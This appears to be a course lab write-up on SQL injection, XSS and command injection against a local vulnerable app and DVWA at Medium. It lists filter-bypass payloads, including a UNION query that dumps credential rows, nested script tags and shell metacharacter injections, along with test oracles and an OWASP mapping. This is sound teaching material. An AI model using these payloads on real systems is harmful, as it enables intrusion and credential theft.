# Part A: Attack (SQLi, XSS, cmdi at Medium)

## List of The Top 10:2021
- A01 Broken Access Control
- A02 Cryptographic Failures
- A03 Injection
- A04 Insecure Design
- A05 Security Misconfiguration
- A06 Vulnerable and Outdated Components
- A07 Identification and Authentication Failures
- A08 Software and Data Integrity Failures
- A09 Security Logging and Monitoring Failures
- A10 Server Side Request Forgery (SSRF)

```bash
python3 attack/attack.py        # from this folder; writes results/attack_results.csv
python3 attack/dvwa_medium.py http://127.0.0.1:PORT   # cross-check on REAL DVWA Medium (needs Docker)
```

## Cross-check on real DVWA at Medium ([`dvwa_medium.py`](dvwa_medium.py))

Because our Medium layer below is our own (vuln-web has no levels), we also
confirm the SQLi on **genuine DVWA at Medium**, which the assignment allows as a
target. DVWA Medium sends `id` by POST through `mysql_real_escape_string()`:

| Payload | Role | Rows | Confirmed |
|---|---|---|---|
| `1` | baseline (single lookup) | 1 | — |
| `1' OR '1'='1` | naive, quoted | 0 | **escaped** — the quote is neutralised |
| `1 OR 1=1` | numeric bypass | 5 | ✅ query structure changed |
| `1 OR 1=1 UNION SELECT user, password FROM users -- -` | union dump | 10 | ✅ dumps every credential row |

The oracle is structural: a single-id lookup must return one user; the numeric
payload (no quote, so escaping is a no-op) returns five, and the UNION returns ten
credential rows. Evidence: `results/dvwa_medium_sqli.csv`. Bring DVWA up with
`python3 -m seclab.targets --up dvwa` or
`docker run -d --rm -p 127.0.0.1:8081:80 vulnerables/web-dvwa`, both bound to
localhost.

## Target and the "Medium" level

The target is the course's `labs/vuln-web/app/vulnweb_app.py`, imported and run
in-process on `127.0.0.1` (the README's no-Docker path, same as the week-6/7
studios). vuln-web has **no security levels**. To meet the "Medium" requirement,
[`medium_app.py`](medium_app.py) puts the kind of filter DVWA uses at Medium in front of the
**unmodified** vuln-web sinks:

| Sink | Medium filter (case-sensitive `str.replace`) | Modeled on |
|---|---|---|
| `POST /login` → `do_login` | removes `--`, `#`, `" OR "`, `" or "` | DVWA-style keyword strip |
| `GET /?name=` → `do_reflect` | removes `<script>` | DVWA Medium XSS (verbatim) |
| `POST /ping` → `do_ping` | removes `&&`, `;` | DVWA Medium cmdi (verbatim) |

Every payload is sent to both **Low** (plain vuln-web) and **Medium**, 3 trials each,
through `seclab.attack.run_payloads`. The script asserts the claim: every naive
payload works at Low but fails at Medium, every bypass works at Medium, and a
benign negative control never confirms.

## Results (from `results/attack_results.csv`, all deterministic: 3/3 or 0/3)

| Class | Naive payload: Low → Medium | Bypass that lands at Medium (3/3) | Technique |
|---|---|---|---|
| SQLi | `admin' OR '1'='1`: 3/3 → **0/3** | `admin' oR '1'='1` | **case**: the filter only strips `" OR "` / `" or "` |
| | `admin'--`: 3/3 → **0/3** | `admin'OR'1'='1` | **whitespace**: the filter needs spaces around OR |
| | | `admin'/*` | **comment**: SQLite accepts an unterminated `/*`, which comments out `AND pw = …` |
| | | `admin'-#-` | **filter order**: removing `#` after `--` re-creates `--` (fails at Low: only the filter makes it an attack) |
| XSS | `<script>alert(1)</script>`: 3/3 → **0/3** | `<scr<script>ipt>alert(1)</script>` | **nesting**: removing the inner tag rebuilds the outer one |
| | | `<SCRIPT>alert(1)</SCRIPT>` | **case**: `str.replace` is case-sensitive, HTML tag names are not |
| cmdi | `127.0.0.1; whoami`: 3/3 → **0/3** | `127.0.0.1 \| whoami` | pipe is not on the blocklist |
| | `127.0.0.1 && whoami`: 3/3 → **0/3** | `127.0.0.1 & whoami` | single `&` (background) is not on the list |
| | | `127.0.0.1 $(whoami)` | command substitution is not on the list |
| | | `127.0.0.1 &;& whoami` | **filter order**: removing `;` re-creates `&&` |

Negative controls (`alice`, `Panic! at the Disco tickets`, `example.com`): 0/3 on
both levels, so the oracles do not fire on ordinary input.

## The oracles (what counts as confirmation)

| Class | Oracle ([`common.py`](../common.py)) | Why it is sound |
|---|---|---|
| SQLi | response contains the admin canary `FLAG-sqli-9f2c-admin-session`, with the password field set to the wrong value `x` | Data that should need the admin password was returned without it. A changed or error response is not counted. |
| XSS | an unescaped `<script` element (case-insensitive) is in the HTML and there is no `&lt;` | That is a tag the browser will execute, not reflected text. `/safe` returns `&lt;script&gt;` and fails this oracle. |
| cmdi | the app's response has `injection_detected: true` **and** `whoami` appears in `would_run` | The metacharacter and the second command both reached the command line. |

Limitation: vuln-web **simulates** the shell (it returns `would_run` and does
not call `os.system`), so the cmdi oracle shows that the payload reached the
command string, not that the command ran. See [`../honesty.md`](../honesty.md).

## OWASP 2021 mapping

All three are **A03:2021 Injection**. In 2021, XSS (CWE-79) was merged into A03,
together with SQLi (CWE-89) and OS command injection (CWE-78). All three are
the same bug: untrusted data crossing into a control channel (SQL, HTML, shell).
The SQLi is also an authentication bypass, which touches **A07:2021
Identification and Authentication Failures**. The Medium filters themselves are
an example of **A04 Insecure Design**: a blocklist used instead of separating
data from code.

## Is Broken Access Control (A01) reachable here?

**No, not as its own class.** The SQLi lets an anonymous user read the admin's
secret. The *impact* looks like an access-control failure (vertical privilege
escalation), but the cause is different:

1. vuln-web has **no access-control logic at all**: no session, no role, no
   ownership check, no per-object authorization. A01 means an authorization
   decision is missing or wrong. Here no authorization decision exists, so there
   is nothing to bypass by forced browsing, IDOR or parameter tampering.
2. The leak comes from **query-structure injection** (A03). If the query is
   parameterized (Part B2), the leak disappears with no access-control change.
   That shows the root cause is injection.
3. If the app added a login session and an `/admin` page without a role check,
   A01 would become reachable. Finding it would need app context (who should see
   what), which is why neither tool in Part C can find it from pattern matching
   (see [`../duel/README.md`](../duel/README.md)).
